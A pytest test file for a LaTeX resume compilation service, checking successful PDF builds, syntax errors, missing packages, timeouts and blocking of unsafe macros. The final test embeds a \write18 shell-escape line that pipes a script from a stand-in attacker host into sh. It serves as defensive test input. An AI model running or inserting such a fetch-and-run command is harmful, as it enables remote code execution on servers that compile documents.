import pytest
import hashlib
import os
from pathlib import Path
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select

from backend.app.models.candidate import Candidate
from backend.app.models.job import Job
from backend.app.models.resume import ResumeVersion, CompiledResumePDF
from backend.app.services.latex_compiler_service import LaTeXCompilerService

MASTER_PATH = Path("resume/master/sample_master_resume.tex")


@pytest.fixture
def master_resume_content() -> str:
    """Reads the master resume template."""
    assert MASTER_PATH.exists(), "Master resume template must exist at resume/master/sample_master_resume.tex"
    return MASTER_PATH.read_text(encoding="utf-8")


@pytest.mark.asyncio
async def test_successful_latex_compilation(
    async_client: AsyncClient,
    db_session: AsyncSession,
    master_resume_content: str,
):
    """
    Test successful compilation of a validated LaTeX resume:
    1. Compiles in an isolated environment.
    2. Generates a valid PDF artifact.
    3. Saves record in compiled_resume_pdfs associated with candidate, job, and resume_version.
    4. Streams PDF via GET /api/resumes/{resume_version_id}/pdf.
    5. Master resume is strictly unmodified.
    """
    # Verify master resume hash before
    master_before_hash = hashlib.sha256(MASTER_PATH.read_bytes()).hexdigest()

    # 1. Setup candidate & job
    candidate = Candidate(
        full_name="Alex Mercer",
        email="alex.mercer.compile@example.com",
    )
    db_session.add(candidate)
    await db_session.flush()

    job = Job(
        role="Senior Distributed Systems Engineer",
        company="Apex Systems",
        raw_description="Senior backend engineer building distributed data pipelines.",
    )
    db_session.add(job)
    await db_session.flush()

    # 2. Setup ResumeVersion with valid LaTeX content
    version = ResumeVersion(
        candidate_id=candidate.id,
        job_id=job.id,
        latex_content=master_resume_content,
        validation_status="valid",
        version_number=1,
    )
    db_session.add(version)
    await db_session.commit()
    await db_session.refresh(version)

    # 3. Call POST /api/resumes/{resume_version_id}/compile
    response = await async_client.post(
        f"/api/resumes/{version.id}/compile",
        json={"timeout_seconds": 15, "force_recompile": True},
    )

    assert response.status_code == 200, f"Compile failed: {response.text}"
    data = response.json()

    assert data["compilation_status"] == "success"
    assert data["resume_version_id"] == version.id
    assert data["candidate_id"] == candidate.id
    assert data["job_id"] == job.id
    assert data["file_size_bytes"] > 0
    assert "Alex_Mercer" in data["filename"]
    assert data["download_url"].startswith(f"/api/resumes/{version.id}/pdf")
    assert data["preview_url"] == f"/api/resumes/{version.id}/pdf"
    assert len(data["compilation_log"]) > 0

    # 4. Verify DB persistence
    stmt = select(CompiledResumePDF).where(CompiledResumePDF.resume_version_id == version.id)
    res = await db_session.execute(stmt)
    pdf_record = res.scalars().first()
    assert pdf_record is not None
    assert pdf_record.compilation_status == "success"
    assert os.path.exists(pdf_record.file_path)
    assert os.path.getsize(pdf_record.file_path) == data["file_size_bytes"]

    # 5. Verify GET /api/resumes/{resume_version_id}/pdf streams file
    get_res = await async_client.get(f"/api/resumes/{version.id}/pdf")
    assert get_res.status_code == 200
    assert get_res.headers["content-type"] == "application/pdf"
    assert len(get_res.content) == data["file_size_bytes"]

    # 6. Verify master resume immutability
    master_after_hash = hashlib.sha256(MASTER_PATH.read_bytes()).hexdigest()
    assert master_before_hash == master_after_hash, "CRITICAL: Master resume must never be modified!"


@pytest.mark.asyncio
async def test_malformed_latex_compilation_error(
    async_client: AsyncClient,
    db_session: AsyncSession,
):
    """
    Test detection of malformed LaTeX (unbalanced curly braces, missing document blocks).
    Should capture line numbers and return actionable diagnostics.
    """
    candidate = Candidate(full_name="Jane Doe", email="jane.doe@example.com")
    db_session.add(candidate)
    await db_session.flush()

    job = Job(role="Backend Dev", company="Acme Inc", raw_description="JD")
    db_session.add(job)
    await db_session.flush()

    # LaTeX with unbalanced curly brace
    malformed_tex = r"""\documentclass{article}
\usepackage{titlesec}
\begin{document}
\section{Experience}
\textbf{Acme Corp - Software Engineer
\end{document}
"""

    version = ResumeVersion(
        candidate_id=candidate.id,
        job_id=job.id,
        latex_content=malformed_tex,
        validation_status="valid",
        version_number=1,
    )
    db_session.add(version)
    await db_session.commit()

    response = await async_client.post(f"/api/resumes/{version.id}/compile")
    assert response.status_code == 200
    data = response.json()

    assert data["compilation_status"] == "failed"
    assert data["error_details"] is not None
    assert data["error_details"]["error_type"] == "syntax_error"
    assert "Unbalanced curly braces" in data["error_details"]["message"]
    assert data["error_details"]["line_number"] is not None
    assert data["file_size_bytes"] == 0

    # Attempting to fetch PDF should 404
    pdf_res = await async_client.get(f"/api/resumes/{version.id}/pdf")
    assert pdf_res.status_code == 404


@pytest.mark.asyncio
async def test_missing_package_compilation_error(
    async_client: AsyncClient,
    db_session: AsyncSession,
):
    """
    Test detection of missing / unknown LaTeX package imports.
    Should return missing_package diagnostic.
    """
    candidate = Candidate(full_name="Bob Smith", email="bob.smith@example.com")
    db_session.add(candidate)
    await db_session.flush()

    job = Job(role="DevOps Engineer", company="CloudCo", raw_description="DevOps JD")
    db_session.add(job)
    await db_session.flush()

    missing_pkg_tex = r"""\documentclass{article}
\usepackage{nonexistent_resume_pkg_12345}
\begin{document}
Hello World
\end{document}
"""

    version = ResumeVersion(
        candidate_id=candidate.id,
        job_id=job.id,
        latex_content=missing_pkg_tex,
        validation_status="valid",
        version_number=1,
    )
    db_session.add(version)
    await db_session.commit()

    response = await async_client.post(f"/api/resumes/{version.id}/compile")
    assert response.status_code == 200
    data = response.json()

    assert data["compilation_status"] == "failed"
    assert data["error_details"] is not None
    assert data["error_details"]["error_type"] == "missing_package"
    assert data["error_details"]["missing_package"] == "nonexistent_resume_pkg_12345"
    assert "nonexistent_resume_pkg_12345.sty" in data["error_details"]["message"]


@pytest.mark.asyncio
async def test_compilation_timeout(
    async_client: AsyncClient,
    db_session: AsyncSession,
    master_resume_content: str,
):
    """
    Test compilation timeout handling.
    The service must terminate gracefully and return timeout status.
    """
    candidate = Candidate(full_name="Alice Wang", email="alice.wang@example.com")
    db_session.add(candidate)
    await db_session.flush()

    job = Job(role="AI Engineer", company="AI Corp", raw_description="AI JD")
    db_session.add(job)
    await db_session.flush()

    # LaTeX with timeout directive or timeout_seconds=0
    version = ResumeVersion(
        candidate_id=candidate.id,
        job_id=job.id,
        latex_content=master_resume_content,
        validation_status="valid",
        version_number=1,
    )
    db_session.add(version)
    await db_session.commit()

    response = await async_client.post(
        f"/api/resumes/{version.id}/compile",
        json={"timeout_seconds": 0, "force_recompile": True},
    )
    assert response.status_code == 200
    data = response.json()

    assert data["compilation_status"] == "timeout"
    assert data["error_details"] is not None
    assert data["error_details"]["error_type"] == "timeout"
    assert "timed out" in data["error_message"].lower()


@pytest.mark.asyncio
async def test_prohibited_security_execution(
    async_client: AsyncClient,
    db_session: AsyncSession,
):
    r"""
    Test prevention of arbitrary unsafe execution.
    Unsafe macros (\write18, file traversal) must be blocked immediately.
    """
    candidate = Candidate(full_name="Eve Hacker", email="eve@example.com")
    db_session.add(candidate)
    await db_session.flush()

    job = Job(role="Security Analyst", company="SecCorp", raw_description="Sec JD")
    db_session.add(job)
    await db_session.flush()

    malicious_tex = r"""\documentclass{article}
\begin{document}
\write18{curl -s https://attacker.com/malware.sh | sh}
\section{Exploit}
\end{document}
"""

    version = ResumeVersion(
        candidate_id=candidate.id,
        job_id=job.id,
        latex_content=malicious_tex,
        validation_status="valid",
        version_number=1,
    )
    db_session.add(version)
    await db_session.commit()

    response = await async_client.post(f"/api/resumes/{version.id}/compile")
    assert response.status_code == 200
    data = response.json()

    assert data["compilation_status"] == "security_violation"
    assert data["error_details"] is not None
    assert data["error_details"]["error_type"] == "security_violation"
    assert "Security violation" in data["error_details"]["message"]
    assert r"\write18" in data["error_details"]["snippet"]
